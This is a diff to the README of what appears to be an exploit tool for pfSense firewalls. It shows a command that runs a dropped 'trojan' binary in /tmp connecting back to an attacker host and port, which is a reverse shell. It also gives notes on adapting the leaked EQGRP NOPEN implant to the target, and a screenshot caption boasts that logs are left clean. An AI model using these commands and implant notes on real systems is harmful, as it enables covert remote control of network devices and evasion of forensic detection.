@@ -63,9 +63,9 @@ For nopen use, just replace the final "execute trojan" command in the `exploit()
     execute_command(base_url, shell_webpath, shell_param, shell_command=f"chmod +x /tmp/.troy;D=-c{connectback_host}:{connectback_port} /tmp/.troy")
 ```
 
-And supply a freebsd nopen (noserver) binary that works on your target system.
+And supply a freebsd nopen (noserver) binary that works on your target system - this may be difficult, you need to patch the `noserver-3.3.2.3-freebsd_8.0-i386` from the EQGRP leak to use `libkvm.so.7` instead of `libkvm.so.5`, and the target system needs the lib32 compat layer... Which doesn't ship by default in pfSense.
 
-I might add a `--nopen` flag to automagic this in a later release, if people *really* care that much. 
+I might add a `--nopen` flag to automagic this in a later release, if people *really* care that much to use nopen. They shouldn't.
 
 ## Screenshot of it in action (showing the logs are sparkly clean).
 ![screenshot](https://github.com/EvergreenCartoons/SenselessViolence/blob/main/Screenshot%20from%202022-09-18%2016-03-39.png?raw=true)
